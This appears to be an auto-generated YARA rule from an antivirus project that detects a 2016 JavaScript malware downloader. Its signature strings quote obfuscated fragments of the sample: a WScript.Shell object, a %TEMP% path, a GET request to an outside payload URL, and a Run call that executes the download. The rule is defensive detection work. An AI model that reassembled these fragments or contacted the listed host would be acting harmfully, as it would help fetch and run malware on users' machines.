rule sig_20160427_168a495005c38626647aee4fe0746e38 {
  meta:
    description = "datamaliciousorder - file 20160427_168a495005c38626647aee4fe0746e38.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "239226bac73deb22a2c4200c9f8330a62ff2362b9432fd1c45ede9a045103584"

  strings:
    $s1  = "function AxoqeIqtoo() {return HfpxuIczhb[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"+\"MP%/\") + \"ulymMiB" ascii
    $s2  = "function AxoqeIqtoo() {return HfpxuIczhb[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"+\"MP%/\") + \"ulymMiB" ascii
    $s3  = "var HfpxuIczhb = function BazyfHgkgn() {return XickaZvefs[JqshjXzrge](\"WScript\"+\".Shell\");}(), BhodpXruhp = 11;" fullword ascii
    $s4  = "function QbibdPthbf(IvxqoNxcvu, CncplJkrvx){FvuotMgofa = FvuotMgofa * 1; return IvxqoNxcvu - CncplJkrvx;};" fullword ascii
    $s5  = "NqbvkGjsoc[OstahXktbg](\"G\" + \"ET\", \"http://directenergy.tv/l2isd\", false);" fullword ascii
    $s6  = "var XickaZvefs = this[\"WScript\"];" fullword ascii
    $s7  = "if (NqbvkGjsoc[\"r\"+\"eadystate\"] < 2 * 2) continue;" fullword ascii
    $s8  = "function PhryeEzzpj(){return SqjgpSynfo + \"\";};" fullword ascii
    $s9  = "function HzrifPpgoy() {return ((OvwznRdzsy == true) && (OvwznRdzsy == AypkhMhrdd)) ? 1 : FvuotMgofa;};" fullword ascii
    $s10 = "ZqhqtMyors = true;" fullword ascii
    $s11 = "function IclkdThhht(){return JqshjXzrge;};" fullword ascii
    $s12 = "function OvgkiCfuuj(){return 23;};" fullword ascii
    $s13 = "function AsphuAmivi()" fullword ascii
    $s14 = "function JyultFvmvu(UytoaDhtna) {var VailzQcqvv = (1, 2, 3, 4, 5, UytoaDhtna); return VailzQcqvv;};" fullword ascii
    $s15 = "OvwznRdzsy = true; " fullword ascii
    $s16 = "}while (GwgwcFugvv);" fullword ascii
    $s17 = "AypkhMhrdd = true; " fullword ascii
    $s18 = "var IpvpiYyrdp = new this[\"D\"+\"ate\"]();" fullword ascii
    $s19 = "var AypkhMhrdd = false;" fullword ascii
    $s20 = "function PafanGewxm(XchgfHmssy){HfpxuIczhb[\"R\"+\"un\"](XchgfHmssy, FvuotMgofa, FvuotMgofa);};" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}